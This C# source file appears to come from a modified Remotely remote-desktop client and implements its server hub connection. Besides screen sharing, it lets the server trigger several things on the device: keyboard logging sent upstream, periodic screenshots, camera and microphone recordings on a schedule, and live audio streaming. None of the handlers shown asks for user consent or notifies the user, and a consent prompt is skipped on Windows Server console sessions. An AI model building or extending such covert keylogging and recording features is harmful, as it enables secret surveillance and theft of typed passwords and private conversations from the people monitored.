using Remotely.Desktop.Shared.Abstractions;
using Remotely.Desktop.Shared.Enums;
using Remotely.Desktop.Shared.Messages;
using Remotely.Shared.Enums;
using Remotely.Shared.Interfaces;
using Remotely.Shared.Models;
using Bitbound.SimpleMessenger;
using Microsoft.AspNetCore.SignalR.Client;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Remotely.Shared.Primitives;
using System.Diagnostics;
using Remotely.Desktop.Native.Windows;

namespace Remotely.Desktop.Shared.Services;

public interface IDesktopHubConnection
{
    HubConnection? Connection { get; }
    HubConnectionState ConnectionState { get; }
    bool IsConnected { get; }

    Task<Result<TimeSpan>> CheckRoundtripLatency(string viewerConnectionId);
    Task<bool> Connect(TimeSpan timeout, CancellationToken cancellationToken);
    Task Disconnect();
    Task DisconnectAllViewers();
    Task DisconnectViewer(IViewer viewer, bool notifyViewer);
    Task<string> GetSessionID();
    Task NotifyRequesterUnattendedReady();
    Task NotifyViewersRelaunchedScreenCasterReady(string[] viewerIDs);
    Task SendAttendedSessionInfo(string machineName);

    Task SendConnectionFailedToViewers(List<string> viewerIDs);
    Task SendConnectionRequestDenied(string viewerID);
    Task SendDtoToViewer<T>(T dto, string viewerId);

    /// <summary>
    /// Sends the cameras of this device to the server.
    /// </summary>
    Task SendCameraDevices(CameraDeviceInfo[] cameras, CameraAudioDeviceInfo[] audioDevices);

    /// <summary>
    /// Sends a chunk of a recorded camera clip to the server.
    /// </summary>
    Task SendCameraClipChunk(string clipId, int chunkIndex, byte[] chunk);

    /// <summary>
    /// Tells the server that every chunk of a camera clip was sent.
    /// </summary>
    Task SendCameraClipUploadCompleted(
        string clipId,
        int quality,
        int durationSeconds,
        string cameraName);

    /// <summary>
    /// Sends the microphones of this device to the server.
    /// </summary>
    Task SendAudioDevices(AudioDeviceInfo[] devices);

    /// <summary>
    /// Sends a chunk of a recorded audio clip to the server.
    /// </summary>
    Task SendAudioClipChunk(string clipId, int chunkIndex, byte[] chunk);

    /// <summary>
    /// Tells the server that every chunk of an audio clip was sent.
    /// </summary>
    Task SendAudioClipUploadCompleted(
        string clipId,
        int quality,
        int durationSeconds,
        int source);

    /// <summary>
    /// Sends one chunk of the live audio stream to the server.
    /// </summary>
    Task SendAudioLiveChunk(byte[] chunk);

    /// <summary>
    /// Sends a burst of captured text to the server.
    /// </summary>
    Task SendKeyboardLog(KeyboardLogChunk chunk);

    Task SendMessageToViewer(string viewerID, string message);
    Task SendScreenshot(byte[] screenshotBytes);
    Task<Result> SendUnattendedSessionInfo(string sessionId, string accessKey, string machineName, string requesterName, string organizationName);
}

public class DesktopHubConnection : IDesktopHubConnection, IDesktopHubClient
{
    private readonly IAppState _appState;

    private readonly ILogger<DesktopHubConnection> _logger;
    private readonly IDtoMessageHandler _messageHandler;
    private readonly IRemoteControlAccessService _remoteControlAccessService;
    private readonly IServiceProvider _serviceProvider;
    private readonly IScreenMonitor _screenMonitor;
    private readonly ICameraMonitor _cameraMonitor;
    private readonly IAudioMonitor _audioMonitor;

    public DesktopHubConnection(
        IDtoMessageHandler messageHandler,
        IServiceProvider serviceProvider,
        IAppState appState,
        IRemoteControlAccessService remoteControlAccessService,
        IScreenMonitor screenMonitor,
        ICameraMonitor cameraMonitor,
        IAudioMonitor audioMonitor,
        IMessenger messenger,
        ILogger<DesktopHubConnection> logger)
    {
        _messageHandler = messageHandler;
        _remoteControlAccessService = remoteControlAccessService;
        _serviceProvider = serviceProvider;
        _appState = appState;
        _screenMonitor = screenMonitor;
        _cameraMonitor = cameraMonitor;
        _audioMonitor = audioMonitor;
        _logger = logger;

        messenger.Register<WindowsSessionEndingMessage>(this, HandleWindowsSessionEnding);
        messenger.Register<WindowsSessionSwitchedMessage>(this, HandleWindowsSessionChanged);
    }

    public HubConnection? Connection { get; private set; }
    public HubConnectionState ConnectionState => Connection?.State ?? HubConnectionState.Disconnected;
    public bool IsConnected => Connection?.State == HubConnectionState.Connected;

    public async Task<Result<TimeSpan>> CheckRoundtripLatency(string viewerConnectionId)
    {
        try
        {
            if (Connection is null)
            {
                return Result.Fail<TimeSpan>("Connection is not yet established.");
            }
            var sw = Stopwatch.StartNew();
            var result = await Connection.InvokeAsync<Result<string>>("PingViewer", viewerConnectionId);
            if (result.IsSuccess)
            {
                return Result.Ok(sw.Elapsed);
            }
            return Result.Fail<TimeSpan>("Latency check failed.");
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Failed to check latency.");
            return Result.Fail<TimeSpan>("An error occurred while checking latency.");
        }
    }

    public async Task<bool> Connect(TimeSpan timeout, CancellationToken cancellationToken)
    {
        try
        {
            if (Connection is not null)
            {
                await Connection.DisposeAsync();
            }

            var result = BuildConnection();
            if (!result.IsSuccess)
            {
                return false;
            }

            Connection = result.Value;

            ApplyConnectionHandlers(Connection);

            var sw = Stopwatch.StartNew();
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    _logger.LogInformation("Connecting to server.");

                    await Connection.StartAsync(cancellationToken);

                    _logger.LogInformation("Connected to server.");

                    break;
                }
                catch (HttpRequestException ex)
                {
                    _logger.LogWarning("Failed to connect to server.  Status Code: {code}", ex.StatusCode);
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error in hub connection.");
                }
                await Task.Delay(3_000, cancellationToken);

                if (sw.Elapsed > timeout)
                {
                    _logger.LogWarning("Timed out while trying to connect to desktop hub.");
                    return false;
                }
            }

            return true;
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error while connecting to hub.");
            return false;
        }
    }

    public async Task Disconnect()
    {
        try
        {
            if (Connection is not null)
            {
                await Connection.StopAsync();
                await Connection.DisposeAsync();
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error disconnecting websocket.");
        }
    }

    public async Task Disconnect(string reason)
    {
        _logger.LogInformation("Disconnecting caster socket.  Reason: {reason}", reason);
        await DisconnectAllViewers();
    }

    public async Task DisconnectAllViewers()
    {
        foreach (var viewer in _appState.Viewers.Values.ToList())
        {
            await DisconnectViewer(viewer, true);
        }
    }

    public Task DisconnectViewer(IViewer viewer, bool notifyViewer)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        viewer.DisconnectRequested = true;
        viewer.Dispose();
        return Connection.SendAsync("DisconnectViewer", viewer.ViewerConnectionId, notifyViewer);
    }

    public Task GetScreenCast(
        string viewerId,
        string requesterName,
        bool notifyUser,
        Guid streamId,
        bool viewOnly)
    {
        // We don't want to tie up the invocation from the server, so we'll
        // start this in a new task.
        _ = Task.Run(async () =>
        {
            try
            {
                using var screenCaster = _serviceProvider.GetRequiredService<IScreenCaster>();
                await screenCaster.BeginScreenCasting(
                    new ScreenCastRequest()
                    {
                        NotifyUser = notifyUser,
                        ViewerId = viewerId,
                        RequesterName = requesterName,
                        StreamId = streamId,
                        ViewOnly = viewOnly
                    });
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error while casting screen.");
            }
        });

        return Task.CompletedTask;
    }

    public async Task<string> GetSessionID()
    {
        if (Connection is null)
        {
            return string.Empty;
        }

        return await Connection.InvokeAsync<string>("GetSessionID");
    }

    public Task NotifyRequesterUnattendedReady()
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.SendAsync("NotifyRequesterUnattendedReady");
    }


    public Task NotifyViewersRelaunchedScreenCasterReady(string[] viewerIDs)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.SendAsync("NotifyViewersRelaunchedScreenCasterReady", viewerIDs);
    }

    public async Task<PromptForAccessResult> PromptForAccess(RemoteControlAccessRequest accessRequest)
    {
        try
        {
            // TODO: Add this to Win32Interop service/interface when it's
            // extracted from current static class.
            if (OperatingSystem.IsWindows() &&
                Shlwapi.IsOS(OsType.OS_ANYSERVER) &&
                Process.GetCurrentProcess().SessionId == Kernel32.WTSGetActiveConsoleSessionId())
            {
                // Bypass "consent prompt" if we're targeting the console session
                // on a Windows Server OS.
                return PromptForAccessResult.Accepted;
            }
            await SendMessageToViewer(accessRequest.ViewerConnectionId, "Asking user for permission");
            return await _remoteControlAccessService.PromptForAccess(
                accessRequest.RequesterDisplayName,
                accessRequest.OrganizationName);
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error while applying connection handlers.");
            return PromptForAccessResult.Error;
        }
    }

    public Task RequestScreenCast(string viewerId, string requesterName, bool notifyUser, Guid streamId, bool viewOnly)
    {
        _appState.InvokeScreenCastRequested(new ScreenCastRequest()
        {
            NotifyUser = notifyUser,
            ViewerId = viewerId,
            RequesterName = requesterName,
            StreamId = streamId,
            ViewOnly = viewOnly
        });
        return Task.CompletedTask;
    }

    public Task SendAttendedSessionInfo(string machineName)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.InvokeAsync("ReceiveAttendedSessionInfo", machineName);
    }

    public Task SendConnectionFailedToViewers(List<string> viewerIDs)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.SendAsync("SendConnectionFailedToViewers", viewerIDs);
    }

    public Task SendConnectionRequestDenied(string viewerID)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }
        return Connection.SendAsync("SendConnectionRequestDenied", viewerID);
    }

    public async Task SendDtoToClient(byte[] dtoWrapper, string viewerConnectionId)
    {
        if (_appState.Viewers.TryGetValue(viewerConnectionId, out var viewer))
        {
            await _messageHandler.ParseMessage(viewer, dtoWrapper);
        }
    }

    public Task SendDtoToViewer<T>(T dto, string viewerId)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        var serializedDto = MessagePack.MessagePackSerializer.Serialize(dto);
        return Connection.SendAsync("SendDtoToViewer", serializedDto, viewerId);
    }

    public Task SendMessageToViewer(string viewerID, string message)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.SendAsync("SendMessageToViewer", viewerID, message);
    }

    public Task SendScreenshot(byte[] screenshotBytes)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.InvokeAsync("SendScreenshot", screenshotBytes);
    }

    /// <summary>
    /// Called by the server to start capturing periodic screenshots of this
    /// device's desktop without a viewer attached.
    /// </summary>
    public Task StartMonitoring(int intervalSeconds, int[]? pauseStartHours = null, int[]? pauseEndHours = null)
    {
        _logger.LogInformation(
            "Server requested screen monitoring.  Interval: {interval} seconds.  Pause windows: {windows}.",
            intervalSeconds,
            pauseStartHours?.Length ?? 0);

        _appState.IsMonitoring = true;
        _screenMonitor.Start(intervalSeconds, pauseStartHours, pauseEndHours);

        return Task.CompletedTask;
    }

    /// <summary>
    /// Called by the server to stop capturing periodic screenshots.
    /// </summary>
    public Task StopMonitoring()
    {
        _logger.LogInformation("Server requested that screen monitoring stop.");

        _screenMonitor.Stop();
        _appState.IsMonitoring = false;

        return Task.CompletedTask;
    }

    /// <summary>
    /// Called by the server to take a screenshot right away.
    /// </summary>
    public Task CaptureScreenshotNow()
    {
        _logger.LogInformation("Server requested a screenshot right now.");

        _screenMonitor.CaptureNow();

        return Task.CompletedTask;
    }

    /// <summary>
    /// Called by the server to record a video clip from one of the cameras or
    /// displays of this device.
    /// </summary>
    public Task StartCameraCapture(string deviceId, CameraCaptureRequest request)
    {
        _logger.LogInformation(
            "Server requested a video recording.  Source: {source}.  Audio: {audio}.  Quality: {quality}.  Duration: {duration} seconds.",
            request.VideoSource,
            request.AudioSource,
            request.Quality,
            request.DurationSeconds);

        _ = Task.Run(async () =>
        {
            try
            {
                // The camera capture service is resolved here, because it
                // depends on this connection, and taking it as a constructor
                // dependency would create a circular dependency.
                var cameraCaptureService = _serviceProvider.GetRequiredService<ICameraCaptureService>();

                // The cameras are always sent, so the administrator can see
                // which ones this device has.
                await cameraCaptureService.SendCameraDevices();

                if (request.DurationSeconds <= 0)
                {
                    // Only the list of cameras was requested.
                    return;
                }

                await cameraCaptureService.CaptureAsync(deviceId, request);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error while recording a video clip.");
            }
        });

        return Task.CompletedTask;
    }

    /// <summary>
    /// Called by the server to record a video clip with the call of an older
    /// server, which does not know the displays and the audio devices yet.
    /// </summary>
    public Task StartCameraCapture(string deviceId, string cameraId, int quality, int durationSeconds)
    {
        return StartCameraCapture(
            deviceId,
            new CameraCaptureRequest(cameraId, (CameraQuality)quality, durationSeconds));
    }

    /// <summary>
    /// Called by the server to stop the camera recording that is running.
    /// </summary>
    public Task StopCameraCapture()
    {
        _logger.LogInformation("Server requested that the camera recording stop.");

        try
        {
            _serviceProvider.GetRequiredService<ICameraCaptureService>().Cancel();
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error while stopping the camera recording.");
        }

        return Task.CompletedTask;
    }

    /// <summary>
    /// Called by the server to start recurring camera recordings.
    /// </summary>
    public Task StartCameraMonitoring(
        string deviceId,
        CameraCaptureRequest request,
        int intervalSeconds,
        int[] pauseStartHours,
        int[] pauseEndHours)
    {
        _logger.LogInformation(
            "Server requested scheduled camera recording. Interval: {interval} seconds. Duration: {duration} seconds.",
            intervalSeconds,
            request.DurationSeconds);

        return _cameraMonitor.StartAsync(
            deviceId,
            request,
            intervalSeconds,
            pauseStartHours,
            pauseEndHours);
    }

    /// <summary>
    /// Called by the server to stop recurring camera recordings.
    /// </summary>
    public Task StopCameraMonitoring()
    {
        _logger.LogInformation("Server requested that scheduled camera recording stop.");
        return _cameraMonitor.StopAsync();
    }

    /// <summary>
    /// Called by the server to record an audio clip from the system audio or
    /// the microphone of this device.
    /// </summary>
    public Task StartAudioCapture(
        string deviceId,
        AudioSource source,
        string microphoneId,
        int quality,
        int durationSeconds)
    {
        _logger.LogInformation(
            "Server requested an audio recording.  Source: {source}.  Quality: {quality}.  Duration: {duration} seconds.",
            source,
            quality,
            durationSeconds);

        _ = Task.Run(async () =>
        {
            try
            {
                // The audio capture service is resolved here, because it
                // depends on this connection, and taking it as a constructor
                // dependency would create a circular dependency.
                var audioCaptureService = _serviceProvider.GetRequiredService<IAudioCaptureService>();

                // The microphones are always sent, so the administrator can
                // see which ones this device has.
                await audioCaptureService.SendAudioDevices();

                if (durationSeconds <= 0)
                {
                    // Only the list of microphones was requested.
                    return;
                }

                var request = new AudioCaptureRequest(
                    source,
                    (AudioQuality)quality,
                    durationSeconds,
                    microphoneId);

                await audioCaptureService.CaptureAsync(deviceId, request);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error while recording an audio clip.");
            }
        });

        return Task.CompletedTask;
    }

    /// <summary>
    /// Called by the server to stop the audio recording that is running.
    /// </summary>
    public Task StopAudioCapture()
    {
        _logger.LogInformation("Server requested that the audio recording stop.");

        try
        {
            _serviceProvider.GetRequiredService<IAudioCaptureService>().Cancel();
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error while stopping the audio recording.");
        }

        return Task.CompletedTask;
    }

    /// <summary>
    /// Called by the server to start recurring audio recordings.
    /// </summary>
    public Task StartAudioMonitoring(
        string deviceId,
        AudioCaptureRequest request,
        int intervalSeconds,
        int[] pauseStartHours,
        int[] pauseEndHours)
    {
        _logger.LogInformation(
            "Server requested scheduled audio recording. Interval: {interval} seconds. Duration: {duration} seconds. Source: {source}.",
            intervalSeconds,
            request.DurationSeconds,
            request.Source);

        return _audioMonitor.StartAsync(
            deviceId,
            request,
            intervalSeconds,
            pauseStartHours,
            pauseEndHours);
    }

    /// <summary>
    /// Called by the server to stop recurring audio recordings.
    /// </summary>
    public Task StopAudioMonitoring()
    {
        _logger.LogInformation("Server requested that scheduled audio recording stop.");
        return _audioMonitor.StopAsync();
    }

    /// <summary>
    /// Called by the server to stream the audio of this device in real time.
    /// </summary>
    public Task StartAudioLive(
        string deviceId,
        AudioSource source,
        string microphoneId)
    {
        _logger.LogInformation("Server requested a live audio stream.  Source: {source}.", source);

        _ = Task.Run(async () =>
        {
            try
            {
                var audioLiveStreamer = _serviceProvider.GetRequiredService<IAudioLiveStreamer>();

                await audioLiveStreamer.StartAsync(
                    new AudioCaptureRequest(
                        source,
                        AudioQuality.Low,
                        0,
                        microphoneId));
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error while starting the live audio stream.");
            }
        });

        return Task.CompletedTask;
    }

    /// <summary>
    /// Called by the server to stop the live audio stream.
    /// </summary>
    public Task StopAudioLive()
    {
        _logger.LogInformation("Server requested that the live audio stream stop.");

        try
        {
            _serviceProvider.GetRequiredService<IAudioLiveStreamer>().StopAsync();
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error while stopping the live audio stream.");
        }

        return Task.CompletedTask;
    }

    /// <summary>
    /// Sends the cameras and the audio devices of this device to the server.
    /// It has its own name on the server, because SignalR does not allow a
    /// hub method to be overloaded.
    /// </summary>
    public Task SendCameraDevices(CameraDeviceInfo[] cameras, CameraAudioDeviceInfo[] audioDevices)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.InvokeAsync("SendCameraDevicesV2", cameras, audioDevices);
    }

    /// <summary>
    /// Sends a chunk of a recorded camera clip to the server.
    /// </summary>
    public Task SendCameraClipChunk(string clipId, int chunkIndex, byte[] chunk)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.InvokeAsync("SendCameraClipChunk", clipId, chunkIndex, chunk);
    }

    /// <summary>
    /// Tells the server that every chunk of a camera clip was sent.
    /// </summary>
    public Task SendCameraClipUploadCompleted(
        string clipId,
        int quality,
        int durationSeconds,
        string cameraName)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.InvokeAsync(
            "CameraClipUploadCompleted",
            clipId,
            quality,
            durationSeconds,
            cameraName);
    }

    /// <summary>
    /// Sends the microphones of this device to the server.
    /// </summary>
    public Task SendAudioDevices(AudioDeviceInfo[] devices)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.InvokeAsync("SendAudioDevices", devices);
    }

    /// <summary>
    /// Sends a chunk of a recorded audio clip to the server.
    /// </summary>
    public Task SendAudioClipChunk(string clipId, int chunkIndex, byte[] chunk)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.InvokeAsync("SendAudioClipChunk", clipId, chunkIndex, chunk);
    }

    /// <summary>
    /// Tells the server that every chunk of an audio clip was sent.
    /// </summary>
    public Task SendAudioClipUploadCompleted(
        string clipId,
        int quality,
        int durationSeconds,
        int source)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.InvokeAsync(
            "AudioClipUploadCompleted",
            clipId,
            quality,
            durationSeconds,
            source);
    }

    /// <summary>
    /// Sends one chunk of the live audio stream to the server.
    /// </summary>
    public Task SendAudioLiveChunk(byte[] chunk)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.InvokeAsync("SendAudioLiveChunk", chunk);
    }

    /// <summary>
    /// Sends a burst of captured text to the server.
    /// </summary>
    public Task SendKeyboardLog(KeyboardLogChunk chunk)
    {
        if (Connection is null)
        {
            return Task.CompletedTask;
        }

        return Connection.InvokeAsync("SendKeyboardLog", chunk);
    }

    /// <summary>
    /// Called by the server to start capturing the text that is typed on
    /// this device.
    /// </summary>
    public Task StartKeyboardLogging(string deviceId)
    {
        _logger.LogInformation("Server requested the keyboard capture.");

        try
        {
            _appState.IsKeyboardCapture = true;
            _serviceProvider.GetRequiredService<IKeyboardLogService>().Start();
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error while starting the keyboard capture.");
        }

        return Task.CompletedTask;
    }

    /// <summary>
    /// Called by the server to stop capturing the text that is typed on this
    /// device.
    /// </summary>
    public Task StopKeyboardLogging()
    {
        _logger.LogInformation("Server requested that the keyboard capture stop.");

        try
        {
            _serviceProvider.GetRequiredService<IKeyboardLogService>().Stop();
            _appState.IsKeyboardCapture = false;
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error while stopping the keyboard capture.");
        }

        return Task.CompletedTask;
    }

    public async Task<Result> SendUnattendedSessionInfo(string unattendedSessionId, string accessKey, string machineName, string requesterName, string organizationName)
    {
        if (Connection is null)
        {
            return Result.Fail("Connection hasn't been made yet.");
        }

        // The flag tells the server that this client knows the displays and
        // the audio devices of a recording.  The method has its own name,
        // because SignalR does not allow a hub method to be overloaded.
        return await Connection.InvokeAsync<Result>(
            "ReceiveUnattendedSessionInfoV2",
            unattendedSessionId,
            accessKey,
            machineName,
            requesterName,
            organizationName,
            true);
    }

    public async Task ViewerDisconnected(string viewerId)
    {
        if (Connection is null)
        {
            return;
        }

        await Connection.SendAsync("DisconnectViewer", viewerId, false);
        if (_appState.Viewers.TryRemove(viewerId, out var viewer))
        {
            viewer.DisconnectRequested = true;
            viewer.Dispose();
        }
        _appState.InvokeViewerRemoved(viewerId);
    }

    private void ApplyConnectionHandlers(HubConnection connection)
    {
        connection.Closed += (ex) =>
        {
            _logger.LogWarning(ex, "Connection closed.");
            return Task.CompletedTask;
        };

        // TODO: Replace parameters with singular DTOs for both client and server methods.
        connection.On<string>(nameof(Disconnect), Disconnect);
        connection.On<string, string, bool, Guid, bool>(nameof(GetScreenCast), GetScreenCast);
        connection.On<string, string, bool, Guid, bool>(nameof(RequestScreenCast), RequestScreenCast);
        connection.On<byte[], string>(nameof(SendDtoToClient), SendDtoToClient);
        connection.On<string>(nameof(ViewerDisconnected), ViewerDisconnected);
        connection.On<RemoteControlAccessRequest, PromptForAccessResult>(nameof(PromptForAccess), PromptForAccess);
        connection.On<int, int[], int[]>(nameof(StartMonitoring), StartMonitoring);
        connection.On(nameof(StopMonitoring), StopMonitoring);
        connection.On(nameof(CaptureScreenshotNow), CaptureScreenshotNow);
        connection.On<string, CameraCaptureRequest>(nameof(StartCameraCapture), StartCameraCapture);
        connection.On<string, string, int, int>(nameof(StartCameraCapture), StartCameraCapture);
        connection.On(nameof(StopCameraCapture), StopCameraCapture);
        connection.On<string, CameraCaptureRequest, int, int[], int[]>(
            nameof(StartCameraMonitoring),
            StartCameraMonitoring);
        connection.On(nameof(StopCameraMonitoring), StopCameraMonitoring);
        connection.On<string, AudioSource, string, int, int>(
            nameof(StartAudioCapture),
            StartAudioCapture);
        connection.On(nameof(StopAudioCapture), StopAudioCapture);
        connection.On<string, AudioCaptureRequest, int, int[], int[]>(
            nameof(StartAudioMonitoring),
            StartAudioMonitoring);
        connection.On(nameof(StopAudioMonitoring), StopAudioMonitoring);
        connection.On<string, AudioSource, string>(
            nameof(StartAudioLive),
            StartAudioLive);
        connection.On(nameof(StopAudioLive), StopAudioLive);
        connection.On<string>(nameof(StartKeyboardLogging), StartKeyboardLogging);
        connection.On(nameof(StopKeyboardLogging), StopKeyboardLogging);

        connection.Reconnected += HandleReconnected;
    }

    private async Task HandleReconnected(string? connectionId)
    {
        if (_appState.Mode != AppMode.Unattended)
        {
            return;
        }

        if (_appState.IsCameraMonitoring)
        {
            await ResumeCameraMonitoringAfterReconnect();
        }

        if (_appState.IsAudioMonitoring)
        {
            await ResumeAudioMonitoringAfterReconnect();
        }
    }

    private async Task ResumeCameraMonitoringAfterReconnect()
    {
        try
        {
            var result = await SendUnattendedSessionInfo(
                _appState.SessionId,
                _appState.AccessKey,
                Environment.MachineName,
                _appState.RequesterName,
                _appState.OrganizationName);

            if (!result.IsSuccess)
            {
                _logger.LogWarning("Could not restore the camera session after reconnect: {reason}", result.Reason);
                await _cameraMonitor.StopAsync();
                return;
            }

            if (Connection is not null)
            {
                await Connection.InvokeAsync("ResumeCameraMonitoring");
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Could not restore scheduled camera recording after reconnect.");
        }
    }

    private async Task ResumeAudioMonitoringAfterReconnect()
    {
        try
        {
            var result = await SendUnattendedSessionInfo(
                _appState.SessionId,
                _appState.AccessKey,
                Environment.MachineName,
                _appState.RequesterName,
                _appState.OrganizationName);

            if (!result.IsSuccess)
            {
                _logger.LogWarning("Could not restore the audio session after reconnect: {reason}", result.Reason);
                await _audioMonitor.StopAsync();
                return;
            }

            if (Connection is not null)
            {
                await Connection.InvokeAsync("ResumeAudioMonitoring");
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Could not restore scheduled audio recording after reconnect.");
        }
    }

    private Result<HubConnection> BuildConnection()
    {
        try
        {
            if (!Uri.TryCreate(_appState.Host, UriKind.Absolute, out _))
            {
                return Result.Fail<HubConnection>("Invalid server URI.");
            }

            var builder = _serviceProvider.GetRequiredService<IHubConnectionBuilder>();

            var connection = builder
                .WithUrl($"{_appState.Host.Trim().TrimEnd('/')}/hubs/desktop")
                .AddMessagePackProtocol()
                .WithAutomaticReconnect(new RetryPolicy())
                .Build();
            return Result.Ok(connection);
        }
        catch (Exception ex)
        {
            return Result.Fail<HubConnection>(ex);
        }
    }

    private async Task HandleWindowsSessionChanged(object subscriber, WindowsSessionSwitchedMessage message)
    {
        try
        {
            if (Connection is null)
            {
                return;
            }

            await Connection.SendAsync("NotifySessionChanged", message.Reason, message.SessionId);

        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error while notifying of session change.");
        }
    }

    private async Task HandleWindowsSessionEnding(object subscriber, WindowsSessionEndingMessage message)
    {
        try
        {
            if (Connection is null)
            {
                return;
            }

            await Connection.SendAsync("NotifySessionEnding", message.Reason);

        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error while notifying of session ending.");
        }
    }
    private class RetryPolicy : IRetryPolicy
    {
        public TimeSpan? NextRetryDelay(RetryContext retryContext)
        {
            return TimeSpan.FromSeconds(3);
        }
    }
}
